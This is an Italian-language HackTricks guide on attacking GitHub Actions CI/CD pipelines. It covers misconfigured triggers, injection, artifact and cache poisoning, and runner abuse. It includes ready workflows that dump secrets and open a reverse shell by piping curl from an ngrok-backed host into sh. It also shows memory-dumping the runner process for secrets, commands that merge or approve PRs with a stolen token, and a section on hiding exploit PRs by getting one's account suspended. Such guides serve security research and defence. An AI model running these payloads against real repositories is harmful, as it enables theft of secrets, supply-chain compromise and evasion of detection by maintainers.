# Abusare di Github Actions

{% hint style="success" %}
Impara e pratica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Impara e pratica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**repository HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informazioni di Base

In questa pagina troverai:

* Un **riassunto di tutti gli impatti** di un attaccante che riesce ad accedere a una Github Action
* Diversi modi per **ottenere accesso a un'azione**:
* Avere **permessi** per creare l'azione
* Abusare dei trigger **pull request** correlati
* Abusare di **altre tecniche di accesso esterno**
* **Pivoting** da un repository gi√† compromesso
* Infine, una sezione sulle **tecniche di post-exploitation per abusare di un'azione dall'interno** (causando gli impatti menzionati)

## Riassunto degli Impatti

Per un'introduzione su [**Github Actions controlla le informazioni di base**](../basic-github-information.md#github-actions).

Nel caso tu possa **eseguire azioni Github arbitrarie/iniettare codice** in un **repository**, potresti essere in grado di:

* **Rubare** i **segreti** da quel repo/organizzazione.
* Se puoi solo iniettare, puoi rubare tutto ci√≤ che √® gi√† presente nel workflow.
* Abusare dei **privilegi del repo** per accedere ad altre piattaforme come AWS e GCP.
* **Eseguire codice in custom workers** (se vengono utilizzati custom workers) e provare a pivotare da l√¨.
* **Sovrascrivere** il **codice** del repository.
* Questo dipende dai privilegi del `GITHUB_TOKEN` (se presente).
* **Compromettere** **deployments** e altri **artifacts**.
* Se il codice sta distribuendo o memorizzando qualcosa, potresti modificarlo e ottenere ulteriori accessi.

## GITHUB\_TOKEN

Questo "**segreto**" (proveniente da `${{ secrets.GITHUB_TOKEN }}` e `${{ github.token }}`) viene fornito quando l'amministratore abilita questa opzione:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Questo token √® lo stesso che utilizzer√† una **Github Application**, quindi pu√≤ accedere agli stessi endpoint: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github dovrebbe rilasciare un [**flow**](https://github.com/github/roadmap/issues/74) che **consente l'accesso cross-repository** all'interno di GitHub, in modo che un repo possa accedere ad altri repo interni utilizzando il `GITHUB_TOKEN`.
{% endhint %}

Puoi vedere i possibili **permessi** di questo token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Nota che il token **scade dopo il completamento del job**.\
Questi token appaiono cos√¨: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Alcune cose interessanti che puoi fare con questo token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="Approve PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Create PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Nota che in diverse occasioni potrai trovare **token utente github all'interno degli envs di Github Actions o nei secrets**. Questi token possono darti pi√π privilegi sul repository e sull'organizzazione.
{% endhint %}

<details>

<summary>Elenca i secrets nell'output di Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Ottenere una reverse shell con secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

√à possibile controllare i permessi dati a un Github Token nei repository di altri utenti **controllando i log** delle azioni:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Esecuzione Consentita

{% hint style="info" %}
Questo sarebbe il modo pi√π semplice per compromettere le Github actions, poich√© questo caso suppone che tu abbia accesso per **creare un nuovo repo nell'organizzazione**, o abbia **privilegi di scrittura su un repository**.

Se ti trovi in questo scenario, puoi semplicemente controllare le [tecniche di Post Exploitation](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Esecuzione dalla Creazione del Repo

Nel caso in cui i membri di un'organizzazione possano **creare nuovi repo** e tu possa eseguire github actions, puoi **creare un nuovo repo e rubare i secrets impostati a livello di organizzazione**.

### Esecuzione da un Nuovo Branch

Se puoi **creare un nuovo branch in un repository che gi√† contiene una Github Action** configurata, puoi **modificarla**, **caricare** il contenuto e poi **eseguire quell'azione dal nuovo branch**. In questo modo puoi **esfiltrare i secrets a livello di repository e di organizzazione** (ma devi sapere come sono chiamati).

Puoi rendere l'azione modificata eseguibile **manualmente**, quando viene **creato un PR** o quando viene **caricato del codice** (a seconda di quanto vuoi essere rumoroso):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Esecuzione Forked

{% hint style="info" %}
Ci sono diversi trigger che potrebbero permettere a un attaccante di **eseguire una Github Action di un altro repository**. Se queste azioni attivabili sono configurate male, un attaccante potrebbe essere in grado di comprometterle.
{% endhint %}

### `pull_request`

Il trigger del workflow **`pull_request`** eseguir√† il workflow ogni volta che viene ricevuta una pull request con alcune eccezioni: per impostazione predefinita, se √® la **prima volta** che stai **collaborando**, un **maintainer** dovr√† **approvare** l'**esecuzione** del workflow:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Poich√© la **limitazione predefinita** √® per i collaboratori **alla prima volta**, potresti contribuire **correggendo un bug/errore valido** e poi inviare **altre PR per abusare dei tuoi nuovi privilegi `pull_request`**.

**Ho testato questo e non funziona**: ~~Un'altra opzione sarebbe creare un account con il nome di qualcuno che ha contribuito al progetto e ha cancellato il suo account.~~
{% endhint %}

Inoltre, per impostazione predefinita **impedisce i permessi di scrittura** e **l'accesso ai secrets** al repository di destinazione come menzionato nei [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Con l'eccezione di `GITHUB_TOKEN`, **i secrets non vengono passati al runner** quando un workflow √® attivato da un repository **forked**. Il **`GITHUB_TOKEN` ha permessi di sola lettura** nelle pull request **da repository forked**.

Un attaccante potrebbe modificare la definizione della Github Action per eseguire cose arbitrarie e aggiungere azioni arbitrarie. Tuttavia, non sar√† in grado di rubare secrets o sovrascrivere il repository a causa delle limitazioni menzionate.

{% hint style="danger" %}
**S√¨, se l'attaccante cambia nella PR la github action che verr√† attivata, la sua Github Action sar√† quella utilizzata e non quella del repository originale!**
{% endhint %}

Poich√© l'attaccante controlla anche il codice eseguito, anche se non ci sono secrets o permessi di scrittura sul `GITHUB_TOKEN`, un attaccante potrebbe ad esempio **caricare artefatti dannosi**.

### **`pull_request_target`**

Il trigger del workflow **`pull_request_target`** ha **permessi di scrittura** sul repository di destinazione e **accesso ai secrets** (e non chiede permesso).

Nota che il trigger del workflow **`pull_request_target`** **viene eseguito nel contesto base** e non in quello dato dalla PR (per **non eseguire codice non attendibile**). Per ulteriori informazioni su `pull_request_target` [**controlla i docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Inoltre, per ulteriori informazioni su questo uso specifico pericoloso, controlla questo [**post sul blog di github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Potrebbe sembrare che poich√© il **workflow eseguito** √® quello definito nel **base** e **non nella PR** sia **sicuro** usare **`pull_request_target`**, ma ci sono **alcuni casi in cui non lo √®**.

E questo avr√† **accesso ai secrets**.

### `workflow_run`

Il trigger [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) consente di eseguire un workflow da un altro quando √® `completed`, `requested` o `in_progress`.

In questo esempio, un workflow √® configurato per essere eseguito dopo che il workflow separato "Run Tests" √® completato:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Inoltre, secondo la documentazione: Il workflow avviato dall'evento `workflow_run` √® in grado di **accedere ai segreti e scrivere token, anche se il workflow precedente non lo era**.

Questo tipo di workflow potrebbe essere attaccato se **dipende** da un **workflow** che pu√≤ essere **attivato** da un utente esterno tramite **`pull_request`** o **`pull_request_target`**. Un paio di esempi vulnerabili possono essere [**trovati in questo blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Il primo consiste nel workflow attivato da **`workflow_run`** che scarica il codice dell'attaccante: `${{ github.event.pull_request.head.sha }}`\
Il secondo consiste nel **passare** un **artifact** dal codice **non fidato** al workflow **`workflow_run`** e utilizzare il contenuto di questo artifact in modo che sia **vulnerabile a RCE**.

### `workflow_call`

TODO

TODO: Verificare se quando eseguito da un pull\_request il codice utilizzato/scaricato √® quello dell'origine o del PR forkato

## Abusare dell'Esecuzione Forkata

Abbiamo menzionato tutti i modi in cui un attaccante esterno potrebbe riuscire a far eseguire un workflow di GitHub, ora diamo un'occhiata a come queste esecuzioni, se mal configurate, potrebbero essere abusate:

### Esecuzione di checkout non fidato

Nel caso di **`pull_request`,** il workflow verr√† eseguito nel **contesto del PR** (quindi eseguir√† il **codice del PR malevolo**), ma qualcuno deve **autorizzarlo prima** e verr√† eseguito con alcune [limitazioni](./#pull\_request).

Nel caso di un workflow che utilizza **`pull_request_target` o `workflow_run`** che dipende da un workflow che pu√≤ essere attivato da **`pull_request_target` o `pull_request`** verr√† eseguito il codice del repository originale, quindi l'**attaccante non pu√≤ controllare il codice eseguito**.

{% hint style="danger" %}
Tuttavia, se l'**azione** ha un **checkout PR esplicito** che **prender√† il codice dal PR** (e non dalla base), utilizzer√† il codice controllato dall'attaccante. Ad esempio (controlla la linea 12 dove viene scaricato il codice del PR):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSICURO. Fornito solo come esempio.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Il codice potenzialmente **non fidato viene eseguito durante `npm install` o `npm build`** poich√© gli script di build e i pacchetti referenziati sono controllati dall'autore del PR.

{% hint style="warning" %}
Un github dork per cercare azioni vulnerabili √®: `event.pull_request pull_request_target extension:yml` tuttavia, ci sono diversi modi per configurare i job in modo sicuro anche se l'azione √® configurata in modo insicuro (come l'uso di condizionali su chi √® l'attore che genera il PR).
{% endhint %}

### Iniezioni di Script nel Contesto <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Nota che ci sono alcuni [**contesti di GitHub**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) i cui valori sono **controllati** dall'**utente** che crea il PR. Se l'azione di GitHub utilizza quei **dati per eseguire qualcosa**, potrebbe portare a **esecuzione arbitraria di codice:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Iniezione di Script in GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Dalla documentazione: Puoi rendere una **variabile d'ambiente disponibile per qualsiasi passaggio successivo** in un job di workflow definendo o aggiornando la variabile d'ambiente e scrivendola nel file di ambiente **`GITHUB_ENV`**.

Se un attaccante potesse **iniettare qualsiasi valore** all'interno di questa **variabile env**, potrebbe iniettare variabili env che potrebbero eseguire codice nei passaggi successivi come **LD\_PRELOAD** o **NODE\_OPTIONS**.

Ad esempio ([**questo**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) e [**questo**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), immagina un workflow che si fida di un artifact caricato per memorizzare il suo contenuto all'interno della variabile env **`GITHUB_ENV`**. Un attaccante potrebbe caricare qualcosa del genere per comprometterlo:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Azioni di Terze Parti di GitHub Vulnerabili

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Come menzionato in [**questo post del blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), questa azione di GitHub consente di accedere agli artifact di diversi workflow e persino repository.

Il problema √® che se il parametro **`path`** non √® impostato, l'artifact viene estratto nella directory corrente e pu√≤ sovrascrivere file che potrebbero essere successivamente utilizzati o persino eseguiti nel workflow. Pertanto, se l'Artifact √® vulnerabile, un attaccante potrebbe abusarne per compromettere altri workflow che si fidano dell'Artifact.

Esempio di workflow vulnerabile:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Questo potrebbe essere attaccato con questo workflow:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Altri Accessi Esterni

### Hijacking di un Namespace Eliminato

Se un account cambia il suo nome, un altro utente potrebbe registrare un account con quel nome dopo un po' di tempo. Se un repository aveva **meno di 100 stelle prima del cambio di nome**, GitHub permetter√† al nuovo utente registrato con lo stesso nome di creare un **repository con lo stesso nome** di quello eliminato.

{% hint style="danger" %}
Quindi, se un'azione sta usando un repository da un account inesistente, √® ancora possibile che un attaccante possa creare quell'account e compromettere l'azione.
{% endhint %}

Se altri repository stavano usando **dipendenze da questi repository utente**, un attaccante sar√† in grado di hijackarli. Qui hai una spiegazione pi√π completa: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
In questa sezione parleremo di tecniche che permetterebbero di **pivotare da un repository a un altro** supponendo di avere qualche tipo di accesso al primo (controlla la sezione precedente).
{% endhint %}

### Cache Poisoning

Una cache √® mantenuta tra **esecuzioni di workflow nello stesso branch**. Ci√≤ significa che se un attaccante **compromette** un **pacchetto** che viene poi memorizzato nella cache e **scaricato** ed eseguito da un workflow **pi√π privilegiato**, sar√† in grado di **compromettere** anche quel workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Artifact Poisoning

I workflow potrebbero usare **artifact da altri workflow e persino repository**, se un attaccante riesce a **compromettere** la GitHub Action che **carica un artifact** che viene poi utilizzato da un altro workflow, potrebbe **compromettere gli altri workflow**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Exploitation da un'Azione

### Accesso a AWS e GCP tramite OIDC

Controlla le seguenti pagine:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Accesso ai segreti <a href="#accessing-secrets" id="accessing-secrets"></a>

Se stai iniettando contenuto in uno script, √® interessante sapere come puoi accedere ai segreti:

* Se il segreto o il token √® impostato come **variabile d'ambiente**, pu√≤ essere direttamente accessibile tramite l'ambiente usando **`printenv`**.

<details>

<summary>Elenca i segreti nell'output di GitHub Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Ottenere una reverse shell con secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Se il segreto √® usato **direttamente in un'espressione**, lo script shell generato √® memorizzato **su disco** ed √® accessibile.
* ```bash
cat /home/runner/work/_temp/*
```
* Per un'azione JavaScript i segreti sono inviati tramite variabili d'ambiente
* ```bash
ps axe | grep node
```
* Per una **custom action**, il rischio pu√≤ variare a seconda di come un programma utilizza il segreto ottenuto dall'**argomento**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abusare dei runner self-hosted

Il modo per trovare quali **Github Actions vengono eseguite in infrastrutture non-Github** √® cercare **`runs-on: self-hosted`** nel file di configurazione yaml di Github Action.

I runner **self-hosted** potrebbero avere accesso a **informazioni extra sensibili**, ad altri **sistemi di rete** (endpoint vulnerabili nella rete? servizio di metadata?) o, anche se isolati e distrutti, **pi√π di un'azione potrebbe essere eseguita contemporaneamente** e quella malevola potrebbe **rubare i segreti** dell'altra.

Nei runner self-hosted √® anche possibile ottenere i **segreti dal processo \_Runner.Listener\_\*\* che conterr√† tutti i segreti dei workflow in qualsiasi fase scaricando la sua memoria:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Consulta [**questo post per maggiori informazioni**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registro delle Immagini Docker di Github

√à possibile creare azioni Github che **costruiscono e memorizzano un'immagine Docker all'interno di Github**.\
Un esempio pu√≤ essere trovato nel seguente espandibile:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Come puoi vedere nel codice precedente, il registro di Github √® ospitato in **`ghcr.io`**.

Un utente con permessi di lettura sul repository sar√† quindi in grado di scaricare l'immagine Docker utilizzando un token di accesso personale:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Poi, l'utente potrebbe cercare **segreti trapelati nei livelli dell'immagine Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Informazioni sensibili nei log di Github Actions

Anche se **Github** cerca di **rilevare valori segreti** nei log delle azioni e **evitare di mostrarli**, **altre informazioni sensibili** che potrebbero essere generate durante l'esecuzione dell'azione non saranno nascoste. Ad esempio, un JWT firmato con un valore segreto non sar√† nascosto a meno che non sia [specificamente configurato](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Coprire le tue tracce

(Tecnica da [**qui**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Prima di tutto, qualsiasi PR sollevata √® chiaramente visibile al pubblico su Github e all'account GitHub di destinazione. In GitHub per impostazione predefinita, **non possiamo eliminare una PR da internet**, ma c'√® un trucco. Per gli account Github che sono **sospesi** da Github, tutte le loro **PR vengono automaticamente eliminate** e rimosse da internet. Quindi, per nascondere la tua attivit√†, devi far **sospendere il tuo account GitHub o farlo segnalare**. Questo **nasconderebbe tutte le tue attivit√†** su GitHub da internet (fondamentalmente rimuovere tutte le tue PR di exploit).

Un'organizzazione su GitHub √® molto proattiva nel segnalare account a GitHub. Tutto ci√≤ che devi fare √® condividere "qualche cosa" in Issue e si assicureranno che il tuo account venga sospeso in 12 ore :p e voil√†, hai reso il tuo exploit invisibile su github.

{% hint style="warning" %}
L'unico modo per un'organizzazione di capire di essere stata presa di mira √® controllare i log di GitHub da SIEM poich√© dall'interfaccia di GitHub la PR sarebbe rimossa.
{% endhint %}

## Strumenti

I seguenti strumenti sono utili per trovare i workflow di Github Action e persino trovare quelli vulnerabili:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Impara e pratica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Impara e pratica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repo di github.

</details>
{% endhint %}
